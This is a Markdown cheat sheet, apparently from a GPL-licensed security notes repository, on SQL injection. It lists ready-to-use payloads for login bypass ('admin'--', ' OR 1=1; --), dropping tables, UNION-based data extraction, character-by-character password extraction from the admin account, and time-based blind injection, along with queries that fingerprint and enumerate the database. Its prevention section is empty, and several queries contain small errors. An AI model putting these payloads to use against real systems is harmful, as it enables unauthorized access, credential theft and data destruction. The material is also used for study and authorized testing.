<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

# SQL Injection(SQLi)
SQL injection allows an attacker to make unwanted requested queries or modifications to the database.

Let's assume the server makes this query with user input. `SELECT * FROM users WHERE = 'userInput';`

If the user were to input `' OR 1=1; DROP TABLE users; --` the resulting query would be `SELECT * FROM users WHERE = '' OR 1=1; DROP TABLE users; -- ';`.

This attack allowed the user to drop the table when it should be allowed.
- `'` ended the user input's string
- `OR 1=1;` allowed the previous query to return true
- `--` commented the following `'` that was there from the server's query
	- Comments could sometime be `#`

<!-- TOC -->

- [Common SQLi attacks](#common-sqli-attacks)
	- [Logins](#logins)
- [How do you know the website is using SQL?](#how-do-you-know-the-website-is-using-sql)
- [How do you know which SQL database is being used?](#how-do-you-know-which-sql-database-is-being-used)
- [How do you know what all the tables are in the db?](#how-do-you-know-what-all-the-tables-are-in-the-db)
- [How do you know what all the columns in a table are?](#how-do-you-know-what-all-the-columns-in-a-table-are)
- [Types of SQLi](#types-of-sqli)
	- [Boolean based SQLi](#boolean-based-sqli)
	- [Blind SQLi](#blind-sqli)
- [How to prevent SQLis](#how-to-prevent-sqlis)

<!-- /TOC -->

## [Common SQLi attacks](#sql-injectionsqli)
- `' OR 1=1; YOUR INJECTION HERE; --`
- `' UNION SELECT column FROM table; --`
	- When getting back a query you sometimes need an exact amount of columns. Use `, 1` to get this.
		- Ex: `' UNION SELECT column, 1, 1 FROM table; --` 3 columns

- `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
	- Possibly bypasses filters

### [Logins](#sql-injectionsqli)
Bypassing logins
- `SELECT * FROM users WHERE password = '' AND username = ''` or `SELECT * FROM users WHERE username = '' AND password = ''`
	- Whichever is first, username input or password input: `' OR 1=1; --`
	- Would login to the first user

- When username is first
`admin'--`
`administrator'--`

## [How do you know the website is using SQL?](#sql-injectionsqli)
- Look for SQL keywords in source code which may tell you what they are using.
- Input single quote `'` and look for errors
- Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
	- How does this work?

## [How do you know which SQL database is being used?](#sql-injectionsqli)
- MySQL: `SELECT VERSION();`
- Postgres: `SELECT version();`
- SQL Server: `SELECT @@VERSION;`
- Oracle: `SELECT * FROM v$version`
- SQLite: `SELECT sqlite_version();`
	- https://www.techonthenet.com/sqlite/sys_tables/index.php
- IBM Db2: `SELECT * FROM sysibm.sysversions;`

## [How do you know what all the tables are in the db?](#sql-injectionsqli)
- MySQL: `SHOW TABLES;`
- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
- Oracle: `SELECT table_name FROM user_tables;`
- SQLite: `SELECT name FROM sqlite_master;`
- IBM Db2: `SELECT tabname FROM syscat.tables'`

## [How do you know what all the columns in a table are?](#sql-injectionsqli)
- MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
- Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
- SQLite doesn't have this feature.
- IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`

## [Types of SQLi](#sql-injectionsqli)

### [Boolean based SQLi](#sql-injectionsqli)
Boolean based SQLi happen when you only get a boolean value back from your SQLi and you have to extract information through this boolean value.
- Determine if it is a boolean based SQLi
	- The output from `' OR 1=1; --` is different from `' OR 1=2; --`

- `AND (SELECT 'a' FROM users WHEN username='admin')='a'; -- `
	- Returns 'a' when there is a admin username. Which returns true.
	- Used to find if there is that username in users
- `AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='a'; --`
	- used to extract the password one character at a time from the admin user
	- Next time 'a' will be changed to 'b' etc
	- substring(column, index, length)
	- Used to guess and check one character at a time for the password
	- Useful when you are getting back boolean information, but need to reconstruct a string

- Look at the response differences between 

### [Blind SQLi](#sql-injectionsqli)
Blind SQLi are where the attacker cannot see any responses, including errors, from the db.

- Time based attacks
	- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
- Out-of-bound network interactions - the attacker injects SQL which triggers the database to communicate with the attacker's server.

## [How to prevent SQLis](#sql-injectionsqli)
- 

`SELECT * FROM products WHERE category = 'Gitfs' OR 1=1 --'`
	- Selects products which has the category of gifts or where 1=1(which is true). This results in returning all the products regardless of the category.